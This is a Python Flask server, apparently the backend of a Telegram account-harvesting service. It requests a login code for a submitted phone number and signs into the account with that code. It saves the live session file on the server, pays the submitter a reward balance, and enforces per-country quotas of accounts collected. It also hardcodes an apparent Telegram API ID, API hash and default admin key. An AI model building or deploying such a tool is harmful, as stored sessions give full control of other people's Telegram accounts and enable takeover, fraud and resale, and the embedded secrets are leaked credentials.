import os
import json
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient

app = Flask(__name__)
CORS(app)

API_ID = int(os.getenv("TG_API_ID", "26759670"))
API_HASH = os.getenv("TG_API_HASH", "685d7e7ae0b7c4dac0bc7373552a46af")
ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "kobir_2026")

SESSION_FOLDER = "sessions"
COUNTRY_FILE = "country.json"
BAL_FILE = "user_bal.json"

os.makedirs(SESSION_FOLDER, exist_ok=True)

active_sessions = {}


def load_json(filepath):
    if not os.path.exists(filepath):
        return {}
    with open(filepath, "r", encoding="utf-8") as f:
        return json.load(f)


def save_json(filepath, data):
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


def is_authorized(req):
    key = req.headers.get("X-API-Key", "")
    return key == ADMIN_API_KEY


@app.route("/", methods=["GET"])
def home():
    return jsonify({
        "success": True,
        "message": "Telegram OTP & Control API is active!"
    })


# -------------------- Capacity Endpoints --------------------
@app.route("/api/capacity", methods=["GET"])
def get_capacity():
    if not is_authorized(request):
        return jsonify({"success": False, "message": "Unauthorized"}), 401
    return jsonify({"success": True, "data": load_json(COUNTRY_FILE)})


@app.route("/api/capacity", methods=["POST"])
def update_capacity():
    if not is_authorized(request):
        return jsonify({"success": False, "message": "Unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    action = data.get("action")
    code = (data.get("code") or "").strip()
    limit = data.get("limit")

    if action not in ["on", "off"] or not code:
        return jsonify({
            "success": False,
            "message": "Valid action ('on' or 'off') and country code are required."
        }), 400

    countries = load_json(COUNTRY_FILE)
    existing_used = countries.get(code, {}).get("used", 0)

    if action == "on":
        countries[code] = {
            "enabled": True,
            "limit": int(limit) if limit is not None else None,
            "used": existing_used
        }
    else:
        countries[code] = {
            "enabled": False,
            "limit": 0,
            "used": existing_used
        }

    save_json(COUNTRY_FILE, countries)
    return jsonify({"success": True, "code": code, "state": countries[code]})


# -------------------- Balance Endpoints --------------------
@app.route("/api/balance/<user_id>", methods=["GET"])
def get_balance(user_id):
    if not is_authorized(request):
        return jsonify({"success": False, "message": "Unauthorized"}), 401

    balances = load_json(BAL_FILE)
    return jsonify({
        "success": True,
        "user_id": str(user_id),
        "balance": balances.get(str(user_id), 0)
    })


@app.route("/api/balance/update", methods=["POST"])
def update_balance():
    if not is_authorized(request):
        return jsonify({"success": False, "message": "Unauthorized"}), 401

    data = request.get_json(silent=True) or {}
    user_id = str(data.get("user_id") or "").strip()
    mode = data.get("mode", "set")
    amount = data.get("amount")

    if not user_id or amount is None:
        return jsonify({"success": False, "message": "user_id and amount are required."}), 400

    try:
        amount = float(amount)
    except ValueError:
        return jsonify({"success": False, "message": "amount must be numeric."}), 400

    balances = load_json(BAL_FILE)
    current = balances.get(user_id, 0)

    if mode == "add":
        new_balance = current + amount
    elif mode == "sub":
        new_balance = max(0, current - amount)
    elif mode == "set":
        new_balance = amount
    else:
        return jsonify({"success": False, "message": "Invalid mode. Use add, sub, or set."}), 400

    balances[user_id] = new_balance
    save_json(BAL_FILE, balances)
    return jsonify({"success": True, "user_id": user_id, "balance": new_balance})


# -------------------- OTP Endpoints --------------------
@app.route("/api/send-otp", methods=["POST"])
async def send_otp():
    data = request.get_json(silent=True) or {}
    phone = (data.get("phone") or "").strip()

    if not phone:
        return jsonify({"success": False, "message": "Phone number is required."}), 400

    countries = load_json(COUNTRY_FILE)
    if countries:
        matched_code = None
        for code in countries:
            if phone.startswith(code):
                matched_code = code
                break

        if not matched_code or not countries[matched_code].get("enabled"):
            return jsonify({"success": False, "message": "Country is not enabled."}), 400

        limit = countries[matched_code].get("limit")
        used = countries[matched_code].get("used", 0)
        if limit is not None and used >= limit:
            countries[matched_code]["enabled"] = False
            save_json(COUNTRY_FILE, countries)
            return jsonify({"success": False, "message": "Country capacity limit reached."}), 400

    session_path = os.path.join(SESSION_FOLDER, phone.replace("+", ""))
    client = TelegramClient(session_path, API_ID, API_HASH)

    try:
        await client.connect()
        sent = await client.send_code_request(phone)

        active_sessions[phone] = {
            "client": client,
            "phone_code_hash": sent.phone_code_hash
        }

        return jsonify({
            "success": True,
            "message": "OTP sent to your Telegram successfully!"
        })
    except Exception as e:
        await client.disconnect()
        return jsonify({"success": False, "message": str(e)}), 500


@app.route("/api/verify-otp", methods=["POST"])
async def verify_otp():
    data = request.get_json(silent=True) or {}
    phone = (data.get("phone") or "").strip()
    code = (data.get("code") or "").strip()
    user_id = str(data.get("user_id") or "").strip()
    reward = float(data.get("reward") or 0)

    if not phone or not code:
        return jsonify({"success": False, "message": "Phone and code are required."}), 400

    session_data = active_sessions.get(phone)
    if not session_data:
        return jsonify({"success": False, "message": "Session expired. Request OTP first."}), 400

    client = session_data["client"]
    phone_code_hash = session_data["phone_code_hash"]

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        client.session.save()
        await client.disconnect()
        del active_sessions[phone]

        countries = load_json(COUNTRY_FILE)
        for c_code, info in countries.items():
            if phone.startswith(c_code):
                info["used"] = info.get("used", 0) + 1
                if info.get("limit") is not None and info["used"] >= info["limit"]:
                    info["enabled"] = False
                break
        save_json(COUNTRY_FILE, countries)

        if user_id and reward > 0:
            balances = load_json(BAL_FILE)
            balances[user_id] = balances.get(user_id, 0) + reward
            save_json(BAL_FILE, balances)

        return jsonify({
            "success": True,
            "message": "Login successful! Session file created."
        })
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
